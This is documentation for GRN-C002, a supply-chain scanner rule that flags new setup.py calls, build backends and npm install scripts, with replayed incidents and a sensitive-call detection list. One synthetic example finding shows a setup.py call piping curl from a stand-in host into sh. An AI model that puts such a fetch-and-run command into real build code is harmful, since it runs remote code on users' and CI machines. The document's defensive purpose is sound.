---
id: GRN-C002
name: new-build-hook
kind: diff
default_severity: warn
status: implemented
---

# GRN-C002 new-build-hook

| | |
|---|---|
| Default severity | `warn` |
| Kind | diff rule: fires only when the trusted version had the property and the new version lost it, or the new version gained a risky property the trusted version lacked. |
| Status | Implemented in 0.1 |

## What it checks

Any of these, compared with the trusted version:

- a new or changed `setup.py` adds a call in the [sensitive call set](#sensitive-call-set),
  anywhere in the file: `setup.py` runs as a script when the sdist is built, and a
  `cmdclass` hook in it runs at install, so a call inside a function or a method counts;
- a sensitive call that the trusted `setup.py` already made now has arguments the trusted
  one never passed to that name: `subprocess.call(['make', 'docs'])` becoming
  `subprocess.call(['sh', '-c', 'curl … | sh'])` ([how arguments are
  compared](#how-arguments-are-compared));
- the build backend changed to one that is not on the allowlist, or to an in-tree backend;
- the trusted version shipped no sdist at all, and the new sdist has either of the above:
  a release that had no build code has gained some;
- an npm `preinstall`, `install` or `postinstall` script was added or changed in the
  tarball's `package.json`. A script that was removed doesn't fire.

`prepare` is not checked, although [SPEC §6.2](../SPEC-v1.md#62-rule-catalog) lists it: npm
runs `prepare` for git dependencies and in a package's own checkout, never when it installs
a published tarball. In the top-200 npm backtest every one of the 18 `prepare` changes was
a build-tool switch (`tsc` to `tshy`, `husky` to `lefthook`), and none of the replayed
incidents used it.

Build backends on the allowlist: `setuptools.build_meta`, `setuptools.build_meta:__legacy__`,
`hatchling.build`, `flit_core.buildapi`, `poetry.core.masonry.api`, `poetry_core.masonry.api`,
`pdm.backend`, `pdm.pep517.api`, `maturin`, `scikit_build_core.build`, `mesonpy`, `uv_build`,
`pbr.build`, `whey`, `sipbuild.api`, `enscons.api`.

## How arguments are compared

Garnet reads the arguments with `ast` and evaluates nothing. For each name in the sensitive
set, the trusted `setup.py`'s calls to it and the new one's are compared as two lists of
argument trees, counted with repeats:

- Two calls have the same arguments when their syntax trees match with line numbers,
  formatting, comments, quote style and a `u` string prefix left out, and with keyword
  arguments in name order: Python binds keywords by name, so `cwd='docs', shell=False` and
  `shell=False, cwd='docs'` pass the same thing. `**` arguments come after the keywords, in
  their own order.
- Any other difference counts: `['make', 'docs']` against `('make', 'docs')`, a different
  string, a different variable name or another expression.
- A call that moved to another line or another function, with the same arguments, matches
  the trusted call. Each trusted call matches one new call, so a second copy of a trusted
  call is reported ("once more than 1.0 did"), even on the same line as the first, and a
  call that was removed isn't.
- A changed call is shown beside a trusted call to the same name that nothing matched, in
  line order, with both argument lists. A long shared beginning is cut to its last 20
  characters so the place they differ stays on the line.

A variable is compared by its name, not by what was assigned to it: when `subprocess.call(cmd)`
stays the same and only `cmd = [...]` changes, the call isn't reported. The call's arguments
are compared in full however long or deeply nested they are; the evidence shows up to
1,000 characters of them. An argument list of more than 2,000 syntax nodes is shown as its
source text, with whitespace collapsed, rather than rebuilt from the tree. If Garnet couldn't
record a trusted call's arguments, the finding says so ("Garnet couldn't compare its
arguments with 1.0's, so they may have changed") instead of treating the call as unchanged.
A finding lists up to 25 lines and counts the rest ("and 5 more").

## Why it matters

Code in `setup.py`, a custom build backend or an npm install script runs on your machine when
the package is built or installed, before you ever import it. It runs in CI with whatever
credentials CI has.

## Example finding

From the [replay](https://github.com/orca-solutions/garnet-guard/blob/main/backtest/npm-incidents.toml)
of nx 21.5.0 ([MAL-2025-41439](https://osv.dev/vulnerability/MAL-2025-41439)), published with
a stolen npm token on 2025-08-26. npm has removed the tarball, so the replay uses the
`package.json` scripts recorded in the
[Nx postmortem](https://nx.dev/blog/s1ngularity-postmortem) and
[StepSecurity's write-up](https://www.stepsecurity.io/blog/supply-chain-security-alert-popular-nx-build-system-package-compromised-with-data-stealing-malware);
the baseline is fetched from the registry.

```text
nx 21.4.1 → 21.5.0: WARN
  WARN  GRN-C002 new-build-hook: 21.5.0 adds or changes a script that runs when the package is installed
           - package.json: postinstall script changed to node telemetry.js (was node ./bin/post-install || exit 0)
```

The same replay reports @ctrl/tinycolor 4.1.1, the first Shai-Hulud package, for a new
`postinstall` running `node bundle.js`.

On PyPI, from the [replay](https://github.com/orca-solutions/garnet-guard/blob/main/backtest/incidents.toml)
of memoryos 2.0.34 ([MAL-2026-16475](https://osv.dev/vulnerability/MAL-2026-16475)). An
attacker with write access pushed release commits and a tag, and the project's own release
workflow published them. The release also bundles a binary that a logging setup function
starts; no other current rule reported it.

```text
memoryos 2.0.33 → 2.0.34: WARN
  WARN  GRN-C002 new-build-hook: 2.0.34 adds code that runs when the sdist is built
           - build backend poetry.core.masonry.api → in-tree:sckit_poetry_build
```

A trusted call given a different command, from the test suite (a synthetic release; no
replayed incident used this shape):

```text
demo 1.0 → 1.1: WARN
  WARN  GRN-C002 new-build-hook: 1.1 changes code that runs when the sdist is built
           - setup.py:9 calls subprocess.call(['sh', '-c', 'curl https://example.invalid/x | sh']) (in BuildDocs.run()), changed from subprocess.call(['make', 'docs']) at line 7 in 1.0
```

## How to resolve it

1. Read the `setup.py` diff or the new backend named in the evidence. For changed
   arguments, compare the two calls the evidence shows, and where an argument is a variable,
   read what it holds in each release. For npm, read the
   script and the file it runs in the new tarball (`npm pack <name>@<version>` downloads it
   without installing).
2. Prefer installing a wheel if the release has one for your platform: wheels don't run
   build code. (`pip install --only-binary :all:` or `uv pip install --no-build`.) For npm,
   `npm install --ignore-scripts` installs without running any lifecycle script.
3. If the build change is expected, merge and add an ignore for this version.

## Allowlisting

Once you've reviewed a release, ignore this rule for that package and version range.
Every ignore needs a reason and an expiry date; after `until` it stops applying and the
report notes that it expired.

```toml
[[garnet.ignore]]
package = "examplelib"
versions = "==2.6.2"
rules = ["GRN-C002"]
reason = "setup.py now downloads a pinned, hash-checked data file; see example/examplelib#510"
until = "2027-06-30"
```

To change the rule's severity for every package instead:

```toml
[garnet.rules]
"GRN-C002" = "block"   # "off" | "info" | "warn" | "block"
```

Suppressed findings still appear in JSON and SARIF output, marked with the ignore that
matched. How to write one is in [the policy guide](../policy.md); the format is in
[SPEC §7](../SPEC-v1.md#7-policy).

## Sensitive call set

A call is sensitive if it resolves, through imports and simple aliasing and without running
any code, to one of these ([SPEC §6.3](../SPEC-v1.md#63-sensitive-call-set)):

- `exec`, `eval`, `compile`, `__import__`, `importlib.__import__`
- `importlib.import_module` with a non-literal argument
- code loaded from a file or built from a code object: `runpy.*`, `zipimport.*`,
  `importlib.util.spec_from_file_location`, `importlib.util.spec_from_loader`,
  `importlib.machinery.SourceFileLoader`, `SourcelessFileLoader` and `ExtensionFileLoader`,
  `imp.load_source`, `load_compiled`, `load_dynamic`, `load_module` and `load_package`,
  `types.FunctionType` and its alias `types.LambdaType`, `types.CodeType`
- `os.system`, `os.popen`, `os.exec*`, `os.spawn*`, `os.posix_spawn*`, `os.fork`, `os.forkpty`,
  `os.startfile`, `pty.spawn`, `pty.fork`
- `subprocess.*` except the exception and result classes `CalledProcessError`,
  `CompletedProcess`, `SubprocessError` and `TimeoutExpired`, and the function
  `list2cmdline`, which start nothing; `_posixsubprocess.*`, `asyncio.create_subprocess_exec`,
  `asyncio.create_subprocess_shell`, `multiprocessing.Process`, the `SpawnProcess`,
  `ForkProcess` and `ForkServerProcess` classes in `multiprocessing.context`,
  `_winapi.CreateProcess`, `distutils.spawn.spawn` and the same function in `distutils.util`,
  `distutils.ccompiler` and `distutils.archive_util`, `pydoc.pipepager`, `pydoc.tempfilepager`
- `ctypes.*`
- `socket.*` and the `ssl.create_connection` and `ssl.socket` that `ssl` imports from it,
  `asyncio.open_connection`, `asyncio.open_unix_connection`, `asyncio.start_server`,
  `asyncio.start_unix_server`, `ftplib.*`, `smtplib.*`, `poplib.*`, `imaplib.*`, `telnetlib.*`,
  `xmlrpc.client.*`, `webbrowser.*`
- `urllib.request.*`, `http.client.*`, `httpx.*`, `requests.*`, `aiohttp.*`, and urllib3's pool
  managers, connection pools and connections: `urllib3.PoolManager`, `ProxyManager`,
  `HTTPConnectionPool`, `HTTPSConnectionPool`, `connection_from_url`, `proxy_from_url` and
  `request`, `urllib3.connection.HTTPConnection`, `HTTPSConnection` and its alias
  `VerifiedHTTPSConnection`, `urllib3.contrib.socks.SOCKSProxyManager`
- `base64.*decode` followed by any of the above
- `marshal.loads`, `pickle.loads`

A name under a module that holds the same object as a listed name, because it defines it or
imports it, counts as the listed name: `builtins` for the bare names (`builtins.exec` is
`exec`, and in a script `__builtins__` is the same module), `posix` and `nt` for `os`
(`posix.system` is `os.system`), `_socket` for `socket`, `_ctypes` for `ctypes`, `_pickle`
for `pickle`, `asyncio.subprocess` and `asyncio.streams` for `asyncio`,
`multiprocessing.context` for `multiprocessing`, `importlib._bootstrap` and
`_frozen_importlib` for `importlib` and `importlib.util`, `importlib._bootstrap_external`
and `_frozen_importlib_external` for `importlib.util` and `importlib.machinery`,
`setuptools._distutils` for `distutils`, `urllib3.poolmanager` for `urllib3`, and
`urllib3.connectionpool` for `urllib3` and `urllib3.connection`. The evidence names the call
as the code writes it.

Set `2026-10-c` (October 30, 2026) added the file loaders, the process calls outside
`subprocess`, more network clients (`asyncio` streams, `urllib3`, mail, FTP, telnet, XML-RPC and
the browser), and the modules that define or import listed names. It also stopped counting
`subprocess`'s exception and result classes and `list2cmdline`, which set `2026-10-b` matched
through `subprocess.*`: building them or quoting a command line starts nothing, and a test
helper raising `CalledProcessError` warned in the top-1,000 PyPI corpus. Left out, because packages
make these calls at import for ordinary reasons: `importlib.util.find_spec` and
`module_from_spec`, `urllib3.disable_warnings`, `multiprocessing.cpu_count`,
`distutils.spawn.find_executable`. Not in the set, because no corpus run has measured what they
would add: `pickle.load` and `pickle.Unpickler`, `multiprocessing.Pool`,
`concurrent.futures.ProcessPoolExecutor` and `importlib.machinery.PathFinder`. A listed function
passed to another call rather than called (`atexit.register(os.system, cmd)`,
`threading.Thread(target=os.system)`) isn't seen, and neither is a listed name reached through
what a call returns (`multiprocessing.get_context("spawn").Process`) or looked up by subscript
(`__builtins__["exec"]`).

The file loaders count in `setup.py` wherever they appear, like every other call in the set,
so a `setup.py` that starts reading its version with `runpy.run_path` or
`importlib.util.spec_from_file_location`, where the trusted one didn't, is reported: the file
it loads runs when the sdist is built.

The set is versioned with the rule. `garnet explain GRN-C002` prints the set your version uses.

## See also

- `garnet explain GRN-C002` prints this rule's summary in your terminal.
- [SPEC §6.2](../SPEC-v1.md#62-rule-catalog), the normative rule catalog.
- [All rules](README.md)
